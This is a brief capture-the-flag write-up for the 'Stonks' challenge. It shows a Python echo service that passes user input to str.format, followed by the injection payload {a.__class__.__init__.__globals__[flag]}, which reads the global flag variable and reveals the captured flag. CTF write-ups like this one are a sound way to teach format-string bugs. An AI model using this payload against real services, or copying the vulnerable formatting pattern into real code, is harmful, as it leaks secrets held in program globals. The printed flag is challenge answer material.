# Stonks

## Task

```python
flag = open("flag.txt").read()

class stonkgenerator: # I heard object oriented programming is popular
    def __init__(self):
        pass
    def __str__(self):
        return "stonks"

def main():
    print(art)
    print("Welcome to Stonks as a Service!")
    print("Enter any input, and we'll say it back to you with any '{a}' replaced with 'stonks'! Try it out!")
    while True:
        inp = input("> ")
        print(inp.format(a=stonkgenerator()))

if __name__ == "__main__":
    main()
```

`nc chal.imaginaryctf.org 42014`

## Solution

we have the flag in globals and we don't have a blacklist,
so we can just use `{a.__class__.__init__}` to get a function
object, then we can just get the globals from that, which contains
our flag:

`{a.__class__.__init__.__globals__[flag]}`

and we get the flag string:

`ictf{c4r3rul_w1th_f0rmat_str1ngs_4a2bd219}`
